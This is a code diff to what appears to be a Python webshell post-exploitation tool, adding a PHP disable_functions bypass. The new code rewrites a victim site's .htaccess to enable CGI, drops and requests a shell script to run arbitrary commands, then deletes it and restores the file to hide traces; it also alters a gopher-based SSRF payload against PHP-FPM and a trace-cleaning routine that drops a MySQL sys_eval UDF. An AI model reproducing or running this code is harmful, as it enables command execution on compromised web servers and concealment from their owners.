@@ -9,7 +9,7 @@ from random import choice, randint, sample
 from string import ascii_letters, digits
 from subprocess import Popen, check_output
 from types import MethodType
-from urllib.parse import quote, unquote_plus
+from urllib.parse import quote, unquote_plus, urlparse, urlunparse
 from hashlib import md5
 from uuid import uuid4
 from codecs import getencoder
@@ -156,6 +156,7 @@ def clean_trace():
     ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
     udf_filename = gget("webshell.udf_path", "webshell", None)
     clean_files = (ld_preload_filename, udf_filename)
+
     for each in clean_files:
         if (each):
             print(color.yellow("\nClean %s ...\n" % each))
@@ -169,9 +170,11 @@ def clean_trace():
     if (udf_filename):
         print(color.yellow("\nClean udf ...\n"))
         execute_sql_command("delete from mysql.func where name='sys_eval';")
+
     gset("webshell.ld_preload_path", None, True, "webshell")
     gset("webshell.ld_preload_func", None, True, "webshell")
     gset("webshell.udf_path", None, True, "webshell")
+    gset("webshell.apache_mod_cgi", False, True, "webshell")
     gset("db_dbms", '', True, "webshell")
     gset("db_ext", '', True, "webshell")
     gset("db_connect_type", '', True, "webshell")
@@ -1599,14 +1602,14 @@ $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
         port = gget("webshell.bdf_fpm.port", "webshell")
         if attack_type == "gopher":
             phpcode += """function curl($url){
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $url);
-                curl_setopt($ch, CURLOPT_HEADER, 0);
-                curl_exec($ch);
-                curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
 }
-ob_start();curl("%s");$fpm_r=ob_get_clean();
-""" % generate_ssrf_payload(host, port, ext_upload_path)
+ob_start();curl("%s");$o=ob_get_clean();%s
+""" % (generate_ssrf_payload(host, port, ext_upload_path), print_command)
         elif attack_type in ["sock", "http_sock"]:
             sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
             phpcode += """
@@ -1634,9 +1637,36 @@ die('stream_socket_client function not exist or sock not exist');
         else:
             phpcode += "die('unknown attack type');"
 
-        phpcode += f"sleep(1);print(file_get_contents('{response_file}'));unlink('{ext_upload_path}');unlink('{response_file}');"
+        phpcode += f"sleep(1);$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
         return phpcode
+    elif (bypass_df == 11):
+        shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
+        res = send("""$cmd = base64_decode("%s");
+$shellcode = "#!/bin/sh\\n";
+$shellcode .= base64_decode("ZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sXG5cbiIK");
+$shellcode .= "$cmd";
+$f=getcwd().DIRECTORY_SEPARATOR."%s";
+rename(".htaccess", ".htaccess.bak");
+file_put_contents('.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .dh");
+file_put_contents($f, $shellcode);
+chmod($f, 0777);
+print($f);
+""" % (base64_encode(command), shellscript_name))
+        real_shellscript_name = res.r_text
 
+        # get shellscript url
+        webshell_url = gget("webshell.url", namespace="webshell")
+        parsed = list(urlparse(webshell_url))
+        webshell_path = parsed[2]
+        shellscript_path = "/" + "/".join(webshell_path.split("/")[:-1]) + shellscript_name
+        parsed[2] = shellscript_path
+        shellscript_url = urlunparse(parsed)
+
+        # request shellscript url and get result
+        res = requests.get(shellscript_url)
+        o = base64_encode(res.text.strip())
+        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(".htaccess");rename(".htaccess.bak", ".htaccess");""" % (o, print_command, real_shellscript_name)
+        return phpcode
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
